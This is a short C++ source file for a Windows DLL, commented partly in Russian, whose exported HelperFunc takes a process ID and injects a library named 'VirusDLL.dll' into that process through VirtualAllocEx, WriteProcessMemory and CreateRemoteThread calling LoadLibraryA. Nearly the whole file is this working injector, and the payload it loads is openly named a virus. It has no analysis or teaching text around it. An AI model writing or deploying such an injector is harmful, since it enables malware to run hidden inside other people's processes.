#include <Windows.h>
#include <winerror.h>

void DllInjector(DWORD dwProcessID) //функция для инъекции в процесс
{
    wchar_t wszBuff[100];
    char szDLLPathToInject[] = { "VirusDLL.dll" };
    int nDLLPathLen = lstrlenA(szDLLPathToInject);
    int nTotBytesToAllocate = nDLLPathLen + 1; // including NULL character.

    // 0. Open The process
    HANDLE hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, dwProcessID);

    // 1. Alocate heap memory in remote process
    LPVOID lpHeapBaseAddress1 = VirtualAllocEx(hProcess, NULL, nTotBytesToAllocate, MEM_COMMIT, PAGE_READWRITE);  //выделение памяти, разрешение на чтение/запись

    // 2. Write the DLL path in the remote alocated heap memory.
    SIZE_T lNumberOfBytesWritten = 0;
    WriteProcessMemory(hProcess, lpHeapBaseAddress1, szDLLPathToInject, nTotBytesToAllocate, &lNumberOfBytesWritten);

    // 3.0. Get the starting address of the function LoadLibrary which is available in kernal32.dll 
    LPTHREAD_START_ROUTINE lpLoadLibraryStartAddress = (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(L"Kernel32.dll"), "LoadLibraryA");

    // 3.1. Call LoadLibraryin remote process and pass the remote heap memory which contains the dll path to load.  создание удалённого потока
    CreateRemoteThread(hProcess, NULL, 0, lpLoadLibraryStartAddress, lpHeapBaseAddress1, 0, NULL);

    CloseHandle(hProcess);
}

extern "C"
{
    __declspec(dllexport) void WINAPI HelperFunc(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow)
    {
        DllInjector(atoi(lpszCmdLine));
    }
}

BOOL WINAPI DllMain(
    HINSTANCE hinstDLL,  // handle to DLL module
    DWORD fdwReason,     // reason for calling function
    LPVOID lpvReserved)  // reserved
{
    // Perform actions based on the reason for calling.
    switch (fdwReason)
    {
    case DLL_PROCESS_ATTACH:    //вызов при загрузке dll в процесс
        // Initialize once for each new process.
        // Return FALSE to fail DLL load.
        break;

    case DLL_THREAD_ATTACH:     //при создании потоков
        // Do thread-specific initialization.
        break;

    case DLL_THREAD_DETACH:     //при удалении потоков
        // Do thread-specific cleanup.
        break;

    case DLL_PROCESS_DETACH:        //при выгрузке

        if (lpvReserved != nullptr)
        {
            break; // do not do cleanup if process termination scenario
        }

        // Perform any necessary cleanup.
        break;
    }
    return TRUE;  // Successful DLL_PROCESS_ATTACH.
}